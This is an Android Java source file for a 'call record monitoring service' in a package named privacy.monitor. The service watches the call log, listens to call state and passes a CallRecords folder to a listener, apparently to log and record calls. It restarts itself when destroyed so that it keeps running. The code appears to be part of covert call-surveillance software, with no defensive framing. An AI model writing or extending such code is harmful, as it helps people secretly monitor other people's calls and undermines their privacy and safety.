package com.privacy.monitor.service;

import java.io.File;
import com.privacy.monitor.listener.MyPhoneStateListener;
import com.privacy.monitor.resolver.CallObserver;
import com.privacy.monitor.resolver.field.CallConstant;
import com.privacy.monitor.resolver.handler.CallHandler;
import com.privacy.monitor.util.Logger;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

/**
 * 通话记录监听服务
 */
public class CallMonitoringService extends Service {

	private static final String TAG = CallMonitoringService.class.getSimpleName();
    private CallObserver callObserver;
	
    @Override
    public IBinder onBind(Intent intent) {
            return null;
    }

    @Override
    public void onCreate() {
            Logger.d(TAG, "通话监听服务启动了");
            
            ContentResolver callResolver = getContentResolver();
            callObserver = new CallObserver(callResolver,new CallHandler(getApplicationContext()));
            callResolver.registerContentObserver(CallConstant.CONTENT_URI,true,callObserver);
            
            File path = new File(Environment.getExternalStorageDirectory()+"/CallRecords/");
            if(!path.exists()){
                  path.mkdir();
            }
            TelephonyManager mTelephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
            mTelephonyManager.listen(new MyPhoneStateListener(this,path),PhoneStateListener.LISTEN_CALL_STATE);
    }

    @Override
    public void onDestroy() {
            Logger.d(TAG,"call服务销毁");
            Intent intent = new Intent(getApplicationContext(),CallMonitoringService.class);
            startService(intent);
            
            if(callObserver !=null){
            	getContentResolver().unregisterContentObserver(callObserver);
            }
            super.onDestroy();
    }

}
